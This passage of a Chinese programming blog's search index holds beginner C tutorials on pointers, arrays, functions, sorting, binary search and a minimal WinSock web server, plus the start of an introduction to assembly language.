1);\nprintf(&quot;array：%d,array+1：%d,array：%d,&amp;array+1：%d\\n&quot;, array, array + 1, &amp;array, &amp;array + 1);\n&#x2F;**\n*        array+1 和 &amp;array+1 的结果是不同的\n*        是因为 array 和 &amp;array 所代表的数据类型不一样\n*        array 代表数组首元素的地址 如：代表赵雅芝这个演员\n*        &amp;array 代表整体数组的地址 如：代表白素贞这个角色\n* \n*        这里array也可以写成 array[0] 是一个int类型 +1 &#x3D; 加了4字节 它+1等于加了一个int型变量\n*        &amp;array 是数组类型+1后 &#x3D; 加了40字节 它+1等于加了一个数组\n* \n*        虽然地址相同，但+1后的值不同。因为他们的类型不一样\n*        array 和 array[0]是等同的\n*&#x2F;\n\n\nsystem(&quot;pause&quot;);\n&#125;\n5.0.5 判断数据类型的大小#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() &#123;\nint a &#x3D; 10;\nint b[10];\n\nprintf(&quot;sizeof(a)：%d\\n&quot;, sizeof(a));                        &#x2F;&#x2F; 4字节\nprintf(&quot;sizeof(int *)：%d\\n&quot;, sizeof(int*));        &#x2F;&#x2F; 32Bit下4四字节，64Bit下8字节\nprintf(&quot;sizeof(b)：%d\\n&quot;, sizeof(b));                        &#x2F;&#x2F; 4*10 &#x3D; 40字节\nprintf(&quot;sizeof(b[0])：%d\\n&quot;, sizeof(b[0]));                &#x2F;&#x2F; 4字节\nprintf(&quot;sizeof(*b)：%d\\n&quot;, sizeof(*b));                        &#x2F;&#x2F; 4个字节(取地址)\n\nsystem(&quot;pause&quot;);\n&#125;\n5.0.6 修改变量的两种方式变量的本质：程序通过变量来申请和命名内存空间。通过变量名访问内存空间。变量：一段连续内存空间的别名。修改变量的两种方式：直接：通过变量名直接修改变量。间接：通过指针地址来间接修改变量。\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n&#x2F;**\n*        采用两种方式来修改变量：直接与间接(提供指针)\n*&#x2F;\n\nvoid main() &#123;\nint a &#x3D; 10;        &#x2F;&#x2F; 变量名可以看作内存地址的别名\na &#x3D; 1;                &#x2F;&#x2F; 直接修改\nprintf(&quot;a &#x3D; %d\\n&quot;, a);\n\nint* p &#x3D; &amp;a;        &#x2F;&#x2F; 变量地址相当于身份证号，拿取 a 的内存地址\nprintf(&quot;p &#x3D; %p &amp;a &#x3D; %p\\n&quot;, p, &amp;a);\n\n*p &#x3D; 100;        &#x2F;&#x2F; 间接 提供内存地址间接修改变量\nprintf(&quot;a &#x3D; %d\\n&quot;, a);\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\n5.0.7 数据类型的本质数据类型可理解为创建变量的模具：是固定内存大小的别名。数据类型的作用：编译器预算对象（变量）分配的内存空间的大小。注意：数据类型只是模具，编译器并没有分配空间，只有根据类型（模具）创建变量（实物），编译器才会分配空间。数据类型和变量的关系：通过数据类型定义变量。\n","slug":"C_2022_3.09.01","date":"2022-03-09T07:20:00.000Z","categories_index":"程序","tags_index":"教学文档,C语言","author_index":"Arvin"},{"id":"d16e3307a16ecb822048b7d5e1538015","title":"WebServer构建","content":"注意：该项目是采用C语言调用 WindowsAPI 进行实现的，如果不掌握简单的网络通信协议和C语言与Windows API 编程请先掌握后再来看。\n什么是协议，理解IP地址和端口的概念作为新时代标杆的我们，已经离不开手机，离不开网络。对于互联网大家可能耳熟能详，但计算机网络的出现比互联网要早很多。\n什么是协议有的人说英语，有的人说中文，有的人说德语，说同一种语言的人可以交流，不同的语言之间就不行了。如果语言不同则需要翻译，否则两人之间无法沟通，或者约定一下，我们都说英语，这个约定就相当于协议。网络协议是通信计算机双方必须共同遵从的一组约定。它的三要素是：语法、语义、时序\n计算机网络沟通用什么TCP &#x2F; IP 传输控制协议：是指能够在多个不同网络间实现信息传输的协议簇。TCP &#x2F;  IP 协议不仅仅指的是TCP 和 IP 两个协议，而是指一个由 FTP、SMTP、TCP、UDP、IP 等协议构成的协议簇，只是因为 TCP &#x2F; IP 协议中 TCP 协议和 IP 协议最具有代表性，所以被称为 TCP &#x2F; IP 协议。\n端口什么是端口设备与外界通讯交流的出口。端口就好比一个房子的门，是出入这间房子的必经之路。\n\n\n\n物理端口\n电脑网口、USB\n\n\n\n虚拟端口\n程序和网络进行通信的端口\n\n\n端口号端口是通过端口号来标记的，端口号只有整数，范围是从 0 到 65535 2字节存储 2^16 - 1\n端口是怎样分配的端口号不是随便使用的，而是按照一定的规定进行分配。\n知名端口知名端口就是众所周知的端口号，范围从 0 到 102380 端口分配给 HTTP 服务21 端口分配给 FTP 服务22 端口分配给 SSH 服务（远程控制服务）\n动态端口动态端口的范围是从 1024 到 65535之所以称为动态端口，是因为它一般不固定分配某种服务，而是动态分配&#x2F;动态分配是指当一个系统进程或应用程序进行需要网络通信时，它向主机申请一个端口，主机从可用端口号中分配一个供它使用。当这个进程关闭时，同时也就释放了所占用的端口号。\nTCP协议TCP 通讯过程中，必须得先建立相关的链接，才能进行相互通讯，这个类似于我们日常生活中的打电话。TCP 的三次握手。​如果想让别人能够打通我们的电话获取相应的服务就需要做以下几件事情：\n\n\n\n买手机\nsocket 创建一个套接字\n\n\n\n插上手机卡\nbind  绑定ip 和 port（端口号）\n\n\n设计手机为正常接听状态（即能够响铃）\nlisten 使套接字变为可以被动链接\n\n\n静静的等着别人拨打\naccept 等待客户端的链接\n\n\n接收电话\nrecv &#x2F; send 接收发送数据\n\n\n如同上面的电话机过程一样，在程序中，如果想要完成一个 TCP 服务功能，需要的程序流程如上第二列内容。\nHTTP协议HTTP 协议即超文本传输协议，是Web联网的基础，也是手机联网常用的协议之一，HTTP 协议是建立在 TCP 协议之上的一种应用。​\n典型的 HTTP 事务处理有如下的过程客户与服务器建立链接。客户向服务器提出请求。服务器接受请求，并根据请求返回相应的文件作为应答。客户与服务关闭链接。​\nHTTP 请求数据方法：GET HEAD POST PUT 等每种请求方法规定了客户和服务器之间不同的信息交换方式，常用的请求方法是 GET 和 POST​\n七层模型：物理层，数据层链路层、网络层、传输层、会话层、表示层、应用层。\n实例代码：注意：在运行HTML文件前，请在项目属性中 - C&#x2F;C++ - 常规 - SDL检查改成否\n#include &lt;stdio.h&gt;\n#include &lt;WinSock2.h&gt;\n​\n\n#define PORT 80\n#define DATASIZE 1024\n​\n\n#pragma comment(lib,&quot;ws2_32.lib&quot;)\n​\n\nvoid sendHtml(SOCKET client, char* filenName);\n​\n\nint main() &#123;\n​\n\nprintf(&quot;图灵服务器开启成功\\n&quot;);\n&#x2F;**\n*        确定使用的 Socket 版本信息\n*        第一个参数：期望使用的版本\n*        第二个参数：获取版本信息\n*&#x2F;\nWSADATA wsadata;\nint ISOK &#x3D; WSAStartup(MAKEWORD(2, 2), &amp;wsadata);\n​\n\nif (ISOK &#x3D;&#x3D; WSAEINVAL) &#123;\nperror(&quot;SOCKET 请求失败……\\n&quot;);\n&#125;\n&#x2F;**\n*        创建一个 Socket\n*        第一个参数：协议族。指定使用什么协议 AF_INET 使用 IPv4\n*        第二个参数：传输类型 Sock_STREAM 流传输\n*        第三个参数：遵从 TCP 协议\n*&#x2F;\nSOCKET server &#x3D; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n​\n\nif (server &#x3D;&#x3D; INVALID_SOCKET) &#123;\nperror(&quot;SOCKET 创建失败……\\n&quot;);\n&#125;\n&#x2F;* 绑定端口号和 IP 地址 *&#x2F;\nstruct sockaddr_in seraddr;\nseraddr.sin_family &#x3D; AF_INET;\nseraddr.sin_port &#x3D; htons(PORT);        &#x2F;&#x2F; 注意：网络是大端存储，电脑是小端存储\nseraddr.sin_addr.s_addr &#x3D; INADDR_ANY;\nISOK &#x3D; bind(server, (struct sockaddr*) &amp; seraddr, sizeof(seraddr));\nif (ISOK &#x3D;&#x3D; SOCKET_ERROR) &#123;\nperror(&quot;BIND 绑定失败……\\n&quot;);\n&#125;\n&#x2F;* 监听 listen 第二个参数：同时监听多少 *&#x2F;\nwhile (1)\n&#123;\nprintf(&quot;等待链接中……\\n&quot;);\nlisten(server, 5);\nSOCKET client &#x3D; accept(server, NULL, NULL);\nif (client &#x3D;&#x3D; INVALID_SOCKET) &#123;\nperror(&quot;ACCEPT 监听失败……\\n&quot;);\n&#125;\n&#x2F;* 接收信息 *&#x2F;\nchar buffer[DATASIZE];\nrecv(client, buffer, sizeof(buffer), 0);\n&#x2F;&#x2F;printf(&quot;%s 共接收到%d条数据\\n&quot;, buffer, strlen(buffer));\n&#x2F;&#x2F;char sneddata[DATASIZE] &#x3D; &quot;&lt;h1 style &#x3D; \\&quot;color:red;\\&quot;&gt;Hello Turing&lt;&#x2F;h1&gt;&quot;;\n&#x2F;&#x2F;send(client, sneddata, strlen(sneddata), 0);\n​\n\n&#x2F;* 网页文件传输 *&#x2F;\nsendHtml(client, &quot;.&#x2F;index.html&quot;);\n​\n\n&#x2F;* 通信完毕，断开链接 *&#x2F;\nclosesocket(client);\n&#125;\n&#x2F;* 关闭服务器 *&#x2F;\nclosesocket(server);\n&#x2F;* 关闭 Socket 套接字请求 *&#x2F;\nWSACleanup();\n​\n\nint num &#x3D; getchar();\n​\n\nreturn 0;\n&#125;\n​\n\nvoid sendHtml(SOCKET client, char* filenName) &#123;\nFILE* pfile &#x3D; fopen(filenName, &quot;r&quot;);\nif (pfile &#x3D;&#x3D; NULL) &#123;\nperror(&quot;HTML 文件打开失败……\\n&quot;);\nreturn;\n&#125;\n​\n\ndo &#123;\nchar senddata[DATASIZE];\nfgets(senddata, DATASIZE, pfile);\nsend(client, senddata, strlen(senddata), 0);\n&#125; while (!feof(pfile));\n​\n\n&#x2F;* 关闭 *&#x2F;\nfclose(pfile);\n&#125;\n","slug":"WebServer_2022_3.08.01","date":"2022-03-07T19:55:00.000Z","categories_index":"程序","tags_index":"教学文档,C语言","author_index":"Arvin"},{"id":"283e767567236e303438acf396f39732","title":"C语言逻辑流程","content":"4.0. 函数程序的最小独立单元 - 语句程序：为解决某一问题而设计的一系列有序指令的集合。数据说明：数据的描述（数据的名称、类型、和初值等）语句：如何处理数据的描述\n函数的定义：函数就是对某一特定功能的抽象函数的作用：代码重用，模块化（便于定位错误）例：编写一个加法函数，参数为两个值，无返回值。\n函数的分类\n无参函数\n\n通过用来执行一些功能比较单一的语句例如：getchar()\n\n有参函数\n通过处理传递过来的参数将函数值返回给主调函数\n\nSin(),cos()\n\n库函数\n\n库函数分为标准库函数和第三方库函数。库函数的特点：右C语言提供；用户无需定义，也不必再程序中做类型说明，只想要在程序前包含有该函数的头文件。典型的如：system（）\n\n函数定义的语法格式：函数定义有4个要素：参数列表，返回类型，函数名和函数体，参数列表和返回值类型，函数名用于和程序中其他实体区分，而函数体是一段可执行的代码块，实现特定的算法或功能。\n\n函数调用的两种方式\n函数调用有两种类型，一是”先定义，后调用”，这要求函数定义和调用语句在同一个文件内，编译器能从函数定义中提取函数的参数列表、输出类型等接口信息。\n\n如果没有函数的定义，就想要将函数实例写在主调用函数之前。举例：函数声明和调用在一个文件内：\n#define _CRT_SECURE_NO_WARNINGS\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid add(int a,int b);\n\nint main() &#123;\n\nint num1,num2;\nprintf(&quot;请输入数值a：&quot;);\nscanf(&quot;%d&quot;, &amp;num1);\nprintf(&quot;\\n请输入数值b：&quot;);\nscanf(&quot;%d&quot;, &amp;num2);\nadd(num1,num2);\nsystem(&quot;pause&quot;);\nreturn 30;\n&#125;\n\nvoid add(int a, int b) &#123;\nint c &#x3D; a + b;\nprintf(&quot;a+b &#x3D; %d\\n&quot;, c);\n&#125;\n\n\n二是”函数声明+函数调用” 大多数情况下，函数的定义与函数的调用，并吧在一个文件内，即使在一个文件中也有可能调用在前而定义在后，这时想要，在调用之前先对函数声明，告诉编译器有这么一个函数的存在。\n\n举例：函数的跨文件调用\n&#x2F;* 头文件 函数.h *&#x2F;\n#pragma once        &#x2F;&#x2F; 防止头文件重复包含\n#define _CRT_SECURE_NO_WARNINGS\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid Hello() &#123;\nprintf(&quot;Hello World\\n&quot;);\n&#125;\n\n&#x2F;&#x2F; 源文件\n#include &quot;4.0 函数.h&quot;\n\n&#x2F;* 函数的定义 *&#x2F;\nvoid add(int a,int b);\n\nint main() &#123;\n\nint num1,num2;\nprintf(&quot;请输入数值a：&quot;);\nscanf(&quot;%d&quot;, &amp;num1);\nprintf(&quot;\\n请输入数值b：&quot;);\nscanf(&quot;%d&quot;, &amp;num2);\nadd(num1,num2);\nHello();\nsystem(&quot;pause&quot;);\nreturn 30;\n&#125;\n\nvoid add(int a, int b) &#123;\nint c &#x3D; a + b;\nprintf(&quot;a+b &#x3D; %d\\n&quot;, c);\n&#125;\n函数注意事项：\n函数的定义在程序中都是平行的，即不允许在一个函数的内部调用（再写）另一个函数。\n函数名是用户自定义标识符，当函数值为整型时类型名可省略。当函数不需要向调用出返回值时，使用void类型名。\n形参列表中的形参是用户自定义标识符，没有参数时，圆括号不能省略，此时函数为无参函数。\n函数在没有声明的时候必须写在主调函数Main之前否则会出错。因为程序是自上而下执行的\n\n4.1. 数组数组的概念\n数组的概念：\n\n数组是可以在内存中连续存储多个元素的结构数组中的所有元素必须属于相同的数据类型举例：int a[5] &#x3D; {0,1,2,3,4}; printf(“&amp;a”);在内存中查看连续的5个元素\n\n数组语法\n\n类型数组名[数组元素个数] &#x3D; {数组元素}；\n例如：int a[10] &#x3D; {0};\nint a[] &#x3D; {1,2,3};  &#x2F;&#x2F; 当数组元素确定的时候数组个数可以省略\nint a[5] &#x3D; {1,2,3};  &#x2F;&#x2F; 不足填充0\nprintf(“%d\\n”, sizeof(a) &#x2F; sizeof(int));&#x2F;&#x2F; 查看数组元素的个数\n一组数组就好比对货物的编号。注意：数组的下标是从0开始的。数组在内存中是连续排列的告诉编译器4条信息：数组名是a，存放的元素是int型，数组存放的元素个数为10，元素值为0，这样便可以对数组及数组元素进行读写访问。\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#define N 5        &#x2F;&#x2F; 只需要修改常量就可以修改数组和循环函数的值\n\nvoid main() &#123;\n\nint a[N] &#x3D; &#123;1,2,3,4,5&#125;;\n\nfor (int i &#x3D; 0; i &lt; N; i++) &#123;\nprintf(&quot;%d\\n&quot;, a[i]);\n&#125;\n\nprintf(&quot;%p\\n&quot;, &amp;a);        &#x2F;&#x2F; %p用来输出指针类型自身的值\n\nprintf(&quot;%d\\n&quot;, sizeof(a)); &#x2F;&#x2F; 查看a数组大小 1int &#x3D; 4 4*5 &#x3D; 20字节\nprintf(&quot;%d\\n&quot;, sizeof(a) &#x2F; sizeof(int));        &#x2F;&#x2F; 查看数组元素的个数\n\n&#x2F;* 循环打印数组地址 *&#x2F;\nfor (int i &#x3D; 0; i &lt; N; i++) &#123;\nprintf(&quot;a[%d] &#x3D; %d &amp;a[%d] &#x3D; %x\\n&quot;, i, a[i], i, &amp;a[i]);        &#x2F;&#x2F;X 打印地址 P也打印地址\n&#125;\n&#x2F;*  数组 &#x3D; 值 数组 &#x3D; 地址\na[0] &#x3D; 1 &amp;a[0] &#x3D; bc36f638\na[1] &#x3D; 2 &amp;a[1] &#x3D; bc36f63c\na[2] &#x3D; 3 &amp;a[2] &#x3D; bc36f640\na[3] &#x3D; 4 &amp;a[3] &#x3D; bc36f644\na[4] &#x3D; 5 &amp;a[4] &#x3D; bc36f648\n*&#x2F;\n\nsystem(&quot;pause&quot;);\n&#125;\n4.1.1 二维数组\n概念\n\n一维数组常称为向量，二维数组，最简单的理解是”有两个下标”，如果把一维数组理解为一行数据，那么，二维数组可形象地表示为行列结构。X Y就是二维，X Y Z 就是三维例子：int a[2][3] &#x3D; {1,2,3,4,5,6}其中第一个方括号中的元素代表行，第二个方括号中的元素代表列\n\n\n\n身高&#124;体态\n丰满的\n苗条的\n\n\n\n修长的\n\n\n\n\n小巧玲珑的\n\n\n\n\n查看数组在内存当中的分布。\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() &#123;\n\n&#x2F;&#x2F; 存储了3*5 &#x3D; 15个元素        3行5列 一行5个元素\nint a[3][5] &#x3D; &#123; &#123; 1,2,3,4,5 &#125;,&#123;6,7,8,9,10&#125;,&#123;11,12,13,14,15&#125; &#125;;\n\nprintf(&quot;%p\\n&quot;, &amp;a);\nprintf(&quot;%d\\n&quot;, sizeof(a));        &#x2F;&#x2F; 大小是 60 4字节*15元素 &#x3D; 60字节\nprintf(&quot;%d\\n&quot;, sizeof(a) &#x2F; sizeof(int));        &#x2F;&#x2F; 60字节 &#x2F; 4字节 &#x3D; 15元素\nsystem(&quot;pause&quot;);\n&#125;\n\n\n初始化二维数组\n\n注意：二维数组中的元素同样是给分配在一段连续的内存初始化表达式中内层花括号代表一行，这样和一维数组中只能对前几个元素初始化不同，二维数组的初始化可以跳过某些中间元素，给后面的元素赋值。\nint a[2][3] &#x3D; &#123;&#123;1,2,3&#125;,&#123;4,5,6&#125;&#125;;\n\n也可以这样初始化：\nint a[][4] &#x3D; &#123;&#123;1,2,3,4&#125;&#125;;\n\n大括号初始化了以后，行号可以省略\n两种赋值方法：#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() &#123;\n\n&#x2F;&#x2F; 存储了3*5 &#x3D; 15个元素        3行5列 一行5个元素\nint a[3][5] &#x3D; &#123; &#123; 1,2,3,4,5 &#125;,&#123;6,7,8,9,10&#125;,&#123;11,12,13,14,15&#125; &#125;;\n\nprintf(&quot;%p\\n&quot;, &amp;a);\n\nprintf(&quot;%d\\n&quot;, sizeof(a));        &#x2F;&#x2F; 大小是 60 4字节*15元素 &#x3D; 60字节\nprintf(&quot;%d\\n&quot;, sizeof(a) &#x2F; sizeof(int));        &#x2F;&#x2F; 60字节 &#x2F; 4字节 &#x3D; 15元素\n\n&#x2F;* 二维数组赋值方法 *&#x2F;\nfor (int i &#x3D; 0; i &lt; 3; i++) &#123;\nfor (int j &#x3D; 0; j &lt; 5; j++) &#123;\nprintf(&quot;a &#x3D; %d\\n&quot;, a[i][j]);\n&#125;\n&#125;\nprintf(&quot;------------------------------------------------\\n&quot;);\n\nint b[3][5] &#x3D; &#123; 0 &#125;;\nint c[3][5] &#x3D; &#123; 0 &#125;;\nfor (int i &#x3D; 0; i &lt; 15; i++) &#123;\nb[i &#x2F; 5][i % 5] &#x3D; i;\n&#125;\n\nfor (int i &#x3D; 0; i &lt; 3; i++) &#123;\nfor (int j &#x3D; 0; j &lt; 5; j++) &#123;\nc[i][j] &#x3D; i * 5 + j + 1;\n&#125;\n&#125;\n\nfor (int i &#x3D; 0; i &lt; 3; i++)&#123;\nfor (int j &#x3D; 0; j &lt; 5; j++) &#123;\nprintf(&quot;b &#x3D; %d\\n&quot;, b[i][j]);\n&#125;\n&#125;\n\nprintf(&quot;------------------------------------------------\\n&quot;);\nfor (int i &#x3D; 0; i &lt; 3; i++) &#123;\nfor (int j &#x3D; 0; j &lt; 5; j++) &#123;\nprintf(&quot;c &#x3D; %d\\n&quot;, c[i][j]);\n&#125;\n&#125;\n\nsystem(&quot;pause&quot;);\n&#125;\n二维数组地址的引用元素a[i][j]的地址是&amp;a[i][j];二维数组的数组名代表该数组的首地址；比如：a实际上就是&amp;a[0][0]。二维数组元素在内存中按行存放，第一行的首地址为a[0]第二行的首地址为a[1]，……，第n行的首地址为a[n-1]；&amp;a[i][j]等价于 a[i]+j。\n4.2 基础算法选择排序法\n如何看懂带算法的程序\n看流程判断和循环条件\n搞清楚每个语句的功能\n试数\n调试\n模仿改\n\n\n选择排序法求极值\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() &#123;\n\nint a[10] &#x3D; &#123; 1,2,3,4,5,6,7,8,9,0 &#125;;\n\nint Max &#x3D; a[0];        &#x2F;&#x2F; 初始化 Max &#x3D; 1 然后去比较如果a[i]大于Max 那将a[i]的值赋予Max\n\nfor (int i &#x3D; 0; i &lt; 10; i++) &#123;\n&#x2F;&#x2F; 这行打断点，打开局部变量调试查看\nif (Max &lt; a[i]) &#123;\nMax &#x3D; a[i];\n&#125;\n&#125;\nprintf(&quot;Max(最大值)的值为：%d\\n&quot;, Max);\n\nfor (int i &#x3D; 0; i &lt; 10; i++) &#123;\n&#x2F;&#x2F; 这行打断点，打开局部变量调试查看\nif (Max &gt; a[i]) &#123;\nMax &#x3D; a[i];\n&#125;\n&#125;\nprintf(&quot;最小值为：%d\\n&quot;, Max);\n\nint i &#x3D; 0;\nwhile (i &lt; 10) &#123;\ni++;\nif (Max &lt; a[i]) &#123;\nMax &#x3D; a[i];\n&#125;\n&#125;\nprintf(&quot;while循环下Max的值为：%d\\n&quot;, Max);\n\nsystem(&quot;pause&quot;);\n&#125;\n选择排序方法一：\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n&#x2F;**\n*        假设初始化 Max 的值是最大的\n*        Max &#x3D; i 在每次循环中加1 然后用 Max 去循环和 j 比较\n*        如果 j 大于 Max 就交换位置\n*        \n*        Max &#x3D; a[0] &#x3D; 1 | j &#x3D; i+1 &#x3D; 2 | &#x3D; 2 1\n*        内循环第一次最终结果：2,1,3,4,5,6,7,8,9,0\n*        内循环第二次最终结果：3,1,2,4,5,6,7,8,9,0\n*        外循环第一次最终结果：9,1,2,3,4,5,6,7,8,0\n*        外循环第二次最终结果：9,8,1,2,3,4,5,6,7,0\n*        外循环第三次最终结果：9,8,7,1,2,3,4,5,6,0\n* \n*        总结：\n*        选择排序法 按住一个位置不动 循环出一个最大值\n*        就好比打擂台 1挑全部 挑完一个再进行下一个\n*        \n*&#x2F;\n\nvoid main() &#123;\n\nint a[10] &#x3D; &#123; 1,2,3,4,5,6,7,8,9,0 &#125;;\n\nint Max &#x3D; 0;\n\nfor (int i &#x3D; 0; i &lt; 10 - 1; i++) &#123;        &#x2F;&#x2F; 最后剩余一个数肯定最小就不用比较了 所以减一\nMax &#x3D; i;\nfor (int j &#x3D; i + 1; j &lt; 10; j++) &#123;\nif (a[Max] &lt; a[j]) &#123;\nint team &#x3D; a[j];\na[j] &#x3D; a[Max];\na[Max] &#x3D; team;\n&#125;\n&#125;\n\n&#x2F;* 逐步分析结果 *&#x2F;\nfor (int i &#x3D; 0; i &lt; 10; i++) &#123;\nprintf(&quot; %4d&quot;, a[i]);\n&#125;\nprintf(&quot;\\n&quot;);\n\n&#125;\n\nprintf(&quot;------------- 最终结果 ---------------\\n&quot;);\n\nfor (int i &#x3D; 0; i &lt; 10; i++) &#123;\nprintf(&quot;a 的值为：%d\\n&quot;, a[i]);\n&#125;\n\nsystem(&quot;pause&quot;);\n&#125;\n选择排序法方法二（优化）：\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n&#x2F;**\n*        10 个人当老大\n*   我只和其中最厉害的打\n*&#x2F;\n\nvoid main() &#123;\n\nint a[10] &#x3D; &#123; 1,2,3,4,5,6,7,8,9,0 &#125;;\nint Max &#x3D; 0;\n\nfor (int i &#x3D; 0; i &lt; 10 - 1; i++) &#123;\nMax &#x3D; i;\nfor (int j &#x3D; i + 1; j &lt; 10; j++) &#123;\nif (a[Max] &lt; a[j]) &#123;\nMax &#x3D; j;        &#x2F;&#x2F; 存储 j 的下标 不直接交换 只比较不交换\n&#125;\n&#125;\nif (Max !&#x3D; i) &#123;\nint team &#x3D; a[i];\na[i] &#x3D; a[Max];\na[Max] &#x3D; team;\n\nfor (int i &#x3D; 0; i &lt; 10; i++) &#123;\nprintf(&quot;%4d&quot;, a[i]);\n&#125;\n&#125;\nprintf(&quot;------------- 最终结果 ---------------\\n&quot;);\nfor (int i &#x3D; 0; i &lt; 10; i++) &#123;\nprintf(&quot;%4d\\n&quot;, a[i]);\n&#125;\n\nsystem(&quot;pause&quot;);\n&#125;\n冒泡排序法冒泡排序法求极值\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n&#x2F;**\n*  冒泡算法是两两的进行比较 9和8比较 8和7比较 如果大就相互交换\n*&#x2F;\n\nvoid main() &#123;\n\nint a[10] &#x3D; &#123; 9,8,7,6,5,4,3,2,1,0 &#125;;\n\nfor (int i &#x3D; 0; i &lt; 10 - 1; i++) &#123;\n\nif (a[i] &gt; a[i + 1]) &#123;\nint team &#x3D; a[i + 1];\na[i + 1] &#x3D; a[i];\na[i] &#x3D; team;\n&#125;\n&#125;\n\nprintf(&quot;a 的最大值为：%d\\n&quot;,a[9]);\n\nsystem(&quot;pause&quot;);\n&#125;\n\n冒泡排序法\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n&#x2F;**\n*        冒泡排序法\n*        和选择排序法不同，选择排序法是固定一个值去比较大小\n*        冒泡排序法是两两进行比较\n*&#x2F;\n\nvoid main37() &#123;\n\nint a[10] &#x3D; &#123; 9,8,7,6,5,4,3,2,1,0 &#125;;\n\nfor (int i &#x3D; 0; i &lt; 10 - 1; i++) &#123;\n&#x2F;&#x2F; i每循环一次都会筛选出最大值\nfor (int j &#x3D; 0; j &lt; 10 - 1 - i; j++) &#123;                &#x2F;&#x2F;-i 是因为一个数已经在底了，所以就不用循环它了\nif (a[j] &gt; a[j + 1]) &#123;\nint team &#x3D; a[j + 1];\na[j + 1] &#x3D; a[j];\na[j] &#x3D; team;\n&#125;\n&#125;\nfor (int i &#x3D; 0; i &lt; 10; i++) &#123;\nprintf(&quot;%4d&quot;, a[i]);\n&#125;\nprintf(&quot;\\n&quot;);\n&#125;\n\nprintf(&quot;\\n------------- 最终结果 ---------------\\n&quot;);\n\nfor (int i &#x3D; 0; i &lt; 10; i++) &#123;\nprintf(&quot;%d\\n&quot;, a[i]);\n&#125;\n\nsystem(&quot;pause&quot;);\n&#125;\n二分查找法二分查找法用于快速查找信息或数据，当然还有更快的方法插值算法二分查找法，是去一段数据的中间值，我们用中间值和我们的数据进行比较，如果我们的数大于中间值，那么小于中间值的我们就不需要进行比较。然后我们找到需要进行比较的头和尾，再去中间值进行判断去排除。反复的循环就可以找到我们需要的数例如：我们有一个数组从1-12，我们需要的数值是9。那么我们可以算出1-12的中间值为6。6和9进行比较，9大于6那么1-6都排除，我们重新定义7为数据的头12为数据的尾。假设我们定义11为中间值，9是小于11的那么11-12就可以排除我们定义7-10为头和尾进行比较。以此类推我们就可以获取到我们的值。\n#define _CRT_SECURE_NO_WARNINGS\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid FindNum(int a[], int data);\n\n&#x2F;&#x2F; 当然还有更快的算法：插值算法\n\nvoid main() &#123;\n\nint a[1000] &#x3D; &#123; 0 &#125;;\nfor (int i &#x3D; 0; i &lt; 1000; i++) &#123;\na[i] &#x3D; i;\nprintf(&quot;i &#x3D; %d\\n&quot;,i);        &#x2F;&#x2F; 打印出数值赋值的数\n&#125;\n\nint data;\nprintf(&quot;请输入您要查询的值：&quot;);\nscanf(&quot;%d&quot;,&amp;data);\n\nFindNum(a,data);\n\nsystem(&quot;pause&quot;);\n&#125;\n\nvoid FindNum(int a[], int data) &#123;\nint head &#x3D; 0;\nint foot &#x3D; 1000 - 1;\nint flag &#x3D; -2;        &#x2F;&#x2F; 找到与没找到的判断值\nint ci &#x3D; 0;        &#x2F;&#x2F; 排除次数\nwhile (head &lt;&#x3D; foot) &#123;\nint median &#x3D; (head + foot) &#x2F; 2;\nprintf(&quot;head 的值：%d Foot的值：%d Median的值：%d 次数：%d\\n&quot;,head,foot,median,++ci);\nif (data &#x3D;&#x3D; a[median]) &#123;\nprintf(&quot;找到了 data的值为：%d\\n&quot;, data);\nflag &#x3D; 1;\nbreak;\n&#125;else if (data &gt; a[median]) &#123;        &#x2F;&#x2F; 值大于中间值，小于中间值的全部值被抛弃\nhead &#x3D; median + 1;\n\n&#125;else &#123;        &#x2F;&#x2F; 值小于中间值，大于中间值的全部值被抛弃\nfoot &#x3D; median - 1;\n&#125;\n&#125;\n\nif (flag &#x3D;&#x3D; -2) &#123;        &#x2F;&#x2F; 如果找不到这个值\nprintf(&quot;找不到这个值\\n&quot;);\n&#125;\n\n\n&#125;\n","slug":"C_2022_3.07.01","date":"2022-03-07T07:55:00.000Z","categories_index":"程序","tags_index":"教学文档,C语言","author_index":"Arvin"},{"id":"a552bb9adfdeebd36af5d88c9d032505","title":"初识汇编","content":"汇编语言是用计算机的思维去操作计算机。\n汇编语言概述汇编语言是直接在硬件上工作的编程语言，首先要了解硬件系统的结构（重点主要在：CPU与内存），才能有效的应用汇编语言对其编程。汇编学习的重点在如何利用硬件系统的编程结构和指令集有效灵活的控制系统进行工作。\n机器语言\n机器语言是机器指令的集合。\n机器指令展开来讲就是一台机器可以正确执行的命令。\n\n指令：01010000（PUSH AX）把X推进堆栈电平脉冲：表示电子信号的浮点。0为平1为凸。早期的程序员将0、1数字编程的程序代码打在纸带或卡片上，1打孔、0不打孔，再将程序通过纸带机或卡片机输入计算机，进行运算。后来，逐渐使用高科技（继电器、晶体管、石英震动），但打孔是始祖。例如：S &#x3D;  768 + 12288 - 1280机器码：101100000000000000000011000001010000000000110000001011010000000000000101假如将程序错写成以下，请找出错误：101100000000000000000011000001010000000001010000010110100000000000000101如果在显示器上输出：welcome to masn。如果使用机器码。你看到这样的程序会怎么想？如果程序里有一个1被误写成0又如何去查找呢？\n汇编语言的产生汇编语言的主体是汇编指令。汇编指令和机器指令的差别在于指令的表示方法上。汇编指令是机器指令便于记忆的书写格式。汇编指令是机器指令的助记符。例如：机器指令1000100111011000表示寄存器BX的内容送到AX中。汇编指令是MOV 